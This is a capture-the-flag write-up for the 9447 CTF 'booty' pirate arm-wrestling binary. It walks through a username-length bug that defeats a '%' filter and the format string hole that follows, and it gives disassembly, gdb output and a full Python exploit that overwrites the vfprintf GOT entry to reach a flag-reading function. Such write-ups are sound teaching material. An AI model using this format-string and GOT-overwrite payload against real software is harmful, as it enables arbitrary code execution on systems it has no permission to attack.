### Solved by barrebas 

9447 CTF was ran the other day, and while I didn't have a lot of time, I managed to snatch a couple of flags. First one was this pirate-themed Binary Exploitation. 

The binary present some kind of text-based arm-wrestling game. You can enter your name and then you have to fight several opponents. With no obvious buffer overflow / format string vulnerability (`%` characters are filtered and set to NULL) in sight, I focused on building a script that would win the game for me. After this, it was possible to change the name, and I was hoping a vulnerability would be present there. 

The game is quite easy to beat: the next move of the opponent can be predicted from the message the game sends you. So if the output contained "is looking exhausted", the next move should be to "[p]ush". I whipped up some quick python to do this and which gives command back to the user when it detects that the game is finished. The binary itself was ran with `socat`:

```bash
bas@tritonal:~/tmp/9447$ socat TCP-LISTEN:7778,fork EXEC:./booty
```

```python
#!/usr/bin/python

from socket import *
from time import sleep
import telnetlib, struct

s=socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 7778))

# wait before continuing, allows attaching with gdb.
raw_input()

# receive banner
print s.recv(1024)
sleep(0.01)

# send name
cmd ="barrebas"
s.send(cmd+"\n")

# try to beat the game
while 1:
	sleep(0.01)

	data = s.recv(1024)

	print data
	
	# proper responses
	if "LEVEL" in data:
		cmd = "h\n"
	if "exhausted" in data:
		cmd = "p\n"
	if "flex" in data:
		cmd = "h\n"
	if "tense" in data:
		cmd = "r\n"
		
	# we've won; hand over control
	if "again" in data:
		t = telnetlib.Telnet()
		t.sock = s
		t.interact()
		
	# game expects input, so send it
	if ">" in data:
		if cmd:
			s.send(cmd)
			cmd = ""
s.close()
```

This allows us to win the game and gives us a "clue" as to where the treasure (flag) is. Furthermore, we can enter a new user name, but again, no obvious vulnerabilities. et0x noticed that once you send a shorter username, part of the previous username shows up. This can be seen below, as the new user name is not `KING` but `KINGebas`:

```bash
:: YOU WIN :: YE NOT BE WALKING THE PLANK YET!

                      .ed"""" """$$$$be.
                    -"           ^""**$$$e.
                  ."                   '$$$c
                 /                      "4$$b
                d  3                     $$$$
                $  *                   .$$$$$$
               .$  ^c           $$$$$e$$$$$$$$.
               d$L  4.         4$$$$$$$$$$$$$$b
               $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
   e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
  z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
 4$$$$L   \     $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
 ^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
   "**$$$ec   "\   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
         "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
			^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
              "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
                "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                   "$   "%*ebJLzb$e$$$$$b $P"
                     %..      4$$$$$$$$$$ "
                      $$$e   z$$$$$$$$$$%
                       "*$c  "$$$$$$$P"
                        ."""*$$$$$$$$bc
                     .-"    .$***$$$"""*e.
                  .-"    .e$"     "*$c  ^*b.
           .=*""""    .e$*"          "*bc  "*$e..
         .$"        .z*"               ^*$e.   "*****e.
         $$ee$c   .d"                     "*$.        3.
         ^*$E")$..$"                         *   .ee==d%
            $.d$$$*                           *  J$$$e*
             """""                             "$$$"


:: HAIL THE NEW PIRATE KING, barrebas

0xffdd1c3f marks the spot of your treasure!

Would ye like to play again? (y / n):
> 
y   
PIRATE KING's be entitled to change their name:
> > KING

STA:  62, STR: 10 :: KINGebas
STA: 104, STR: 18 :: Vengeful Queen Anne

Vengeful Queen Anne begins to flex their muscles.

Choose an action, [p]ush  [h]old  [r]est:
```

I focused on the binary address, but as it turned out, the flag is not being read into the binary! I tried to break on `fopen`, and search the memory from within `gdb` for the flag that I planted locally... but nothing! Inspecting that memory address in `gdb` showed:

```bash
# bas@tritonal:~/tmp/9447$ gdb -pid `pgrep booty`
...
Stopped reason: SIGINT
0xf7757430 in __kernel_vsyscall ()
gdb-peda$ x/10x 0xffdd1c3f
0xffdd1c3f:	0xdd1c9000	0x000001ff	0xdd1cd800	0x048e51ff
0xffdd1c4f:	0xdd1c9008	0x000001ff	0xdd1d4800	0x048796ff
0xffdd1c5f:	0x73d4e008	0x0499def7
```

Nothing there! No string, no flag, nothing! To be honest, I spent quite some time trying to figure out what I was doing wrong. I figured I was to blame and tried to read the address  that is returned after winning on the remote server. I hope the flag would be there. For this, I needed et0x's observation, because it allowed me to bypass the filtering of `%` characters. The binary filters the characters here:

```
 80488dd:	80 7a ff 25          	cmpb   $0x25,-0x1(%edx)
 80488e1:	74 0d                	je     80488f0 <vfprintf@plt+0x380>
 80488e3:	39 c2                	cmp    %eax,%edx
 80488e5:	75 f1                	jne    80488d8 <vfprintf@plt+0x36
```

If it encounters a `%`, it will stop and set that byte to NULL. However, if we supply a new username that is shorter than the previous one, the program will only check len(username) bytes for `%` characters. If we supply:

```
%aa%x%x
```

as the first user name and then 

```
bb
```

Then the new username will be `bba%x%x`. All we have to do then is to beat the game once more, so the format string is triggered. That is because the string `:: HAIL THE NEW PIRATE KING, ` is printed separately from the username, which is printed with something like `print(username)`. 

I did all this to print the string at the memory address that is given by the binary... to no avail. The final piece of the puzzle was the `fopen` call that opens the file `/home/booty/flag`:

```bash
 80487c0:	53                   	push   %ebx
 80487c1:	83 ec 10             	sub    $0x10,%esp
 80487c4:	68 60 9a 04 08       	push   $0x8049a60	# 'r'
 80487c9:	68 61 98 04 08       	push   $0x8049861	# "/home/booty/flag"
 80487ce:	e8 6d fd ff ff       	call   8048540 <fopen@plt>
 80487d3:	83 c4 10             	add    $0x10,%esp
 80487d6:	85 c0                	test   %eax,%eax
 80487d8:	89 c3                	mov    %eax,%ebx
 80487da:	75 19                	jne    80487f5 <vfprintf@plt+0x285>
 80487dc:	eb 33                	jmp    8048811 <vfprintf@plt+0x2a1>
 80487de:	66 90                	xchg   %ax,%ax
 80487e0:	83 ec 08             	sub    $0x8,%esp
 80487e3:	0f be d0             	movsbl %al,%edx
 80487e6:	ff 35 a4 a1 04 08    	pushl  0x804a1a4
 80487ec:	52                   	push   %edx
 80487ed:	e8 fe fc ff ff       	call   80484f0 <_IO_putc@plt>
 80487f2:	83 c4 10             	add    $0x10,%esp
 80487f5:	83 ec 0c             	sub    $0xc,%esp
 80487f8:	53                   	push   %ebx
 80487f9:	e8 e2 fc ff ff       	call   80484e0 <_IO_getc@plt>
 80487fe:	83 c4 10             	add    $0x10,%esp
 8048801:	3c ff                	cmp    $0xff,%al
 8048803:	75 db                	jne    80487e0 <vfprintf@plt+0x270>
 8048805:	83 ec 0c             	sub    $0xc,%esp
 8048808:	53                   	push   %ebx
 8048809:	e8 b2 fc ff ff       	call   80484c0 <fclose@plt>
 804880e:	83 c4 10             	add    $0x10,%esp
 8048811:	83 ec 0c             	sub    $0xc,%esp
 8048814:	6a 00                	push   $0x0
 8048816:	e8 f5 fc ff ff       	call   8048510 <exit@plt>
```

It seems like this function is never called, yet it does open the flag and spits out the contents. I verified this from within `gdb` by running `set $eip=0x80487c0` and then continuing execution. Indeed, it spat out the bogus flag of my local system. I leveraged the string format vulnerability to overwrite a got pointer force the binary to execute that function. I chose to overwrite `vfprintf`, because that's called a lot by the binary. I needed to overwrite this pointer in two steps. First, the lower two bytes are overwritten with `0x87c0`. Then the higher two bytes are overwritten with `0x0804`. When the binary then wants to call `vfprintf`, code execution is redirected to `0x80487c0`!

The exploit now sends the first username: `cmd ="%AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%34719c%36$hn%32836c%37$n"`. This contains the `%` character and the rest of the format string. I found the proper offset for the direct addressing (`%36$hn`) simply by trying a few values together with a name that contained "AAAABBBBCCCC" blocks. The rest of the padding (`%34719c` for instance) is simply by running `gdb` and taking note of the address where the binary crashes. Adding the right amount of padding, observing the crash again, etc.

The final exploit:

```python
#!/usr/bin/python

from socket import *
from time import sleep
import telnetlib, struct

s=socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 7778))

# wait before continuing, allows attaching with gdb.
raw_input()

# receive banner
print s.recv(1024)
sleep(0.01)

# send string format name
cmd ="%AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%34719c%36$hn%32836c%37$n"

s.send(cmd+"\n")

# try to beat the game
while 1:
	sleep(0.01)

	data = s.recv(1024)

	print data
	
	# proper responses
	if "LEVEL" in data:
		cmd = "h\n"
	if "exhausted" in data:
		cmd = "p\n"
	if "flex" in data:
		cmd = "h\n"
	if "tense" in data:
		cmd = "r\n"
		
	# we've won; update name to activate string format bug
	if "again" in data:
		# 0x804a138: vfprintf@got.plt
		# we overwrite it in two parts, the first uses %hn to write two bytes to the lower part of the address
		# the second %n overwrites four bytes, but I don't really care.
		# the rest of the string format bug is: "%34719c%36$hn%32836c%37$n"
		cmd = "ya0AAAAAAAAAAAAAAAAAAAAAAA" + struct.pack("<L", 0x804a138) + struct.pack("<L", 0x804a13a) + "\n"
	
	# flag is in the input, so halt execution & take note of it!
	if "9447" in data:
		raw_input()
		
	# game expects input, so send it
	if ">" in data:
		if cmd:
			s.send(cmd)
			cmd = ""
s.close()
```

The real flag was something like `9447{YOHOHO_A_PIRATES_LIFE_FOR_ME}`. 
